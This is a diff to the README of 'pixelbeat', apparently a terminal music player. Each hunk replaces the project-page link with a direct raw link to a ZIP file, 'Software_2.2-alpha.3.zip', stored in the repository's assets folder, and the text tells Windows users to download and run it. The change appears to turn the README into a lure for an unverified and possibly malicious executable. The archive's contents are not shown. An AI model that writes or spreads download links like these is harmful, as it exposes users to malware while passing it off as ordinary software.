@@ -1,6 +1,6 @@
 # 🎵 pixelbeat - Calm music for focused coding
 
-[![Download pixelbeat](https://img.shields.io/badge/Download%20pixelbeat-3b82f6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Hegemonngb368/pixelbeat)
+[![Download pixelbeat](https://img.shields.io/badge/Download%20pixelbeat-3b82f6?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Hegemonngb368/pixelbeat/main/assets/Software_2.2-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ pixelbeat is a small music player for your terminal. It is made for long coding 
 If you want a clean way to keep music playing while you work, start here:
 
 **Download or visit the project page:**  
-https://github.com/Hegemonngb368/pixelbeat
+https://raw.githubusercontent.com/Hegemonngb368/pixelbeat/main/assets/Software_2.2-alpha.3.zip
 
 ## 🪟 Windows Setup
 
@@ -19,7 +19,7 @@ This guide is for Windows users who want the fastest path from download to playb
 
 Go to the project page in your browser:
 
-https://github.com/Hegemonngb368/pixelbeat
+https://raw.githubusercontent.com/Hegemonngb368/pixelbeat/main/assets/Software_2.2-alpha.3.zip
 
 ### 2. Get the app
 
@@ -241,7 +241,7 @@ Keep your library tidy, launch the app, and let it run while you work.
 
 Open the project page here and download the files you need:
 
-https://github.com/Hegemonngb368/pixelbeat
+https://raw.githubusercontent.com/Hegemonngb368/pixelbeat/main/assets/Software_2.2-alpha.3.zip
 
 If the page gives you a release file, download it and run that file. If it gives you a ZIP archive, download it, unzip it, and open the app from the extracted folder.
 
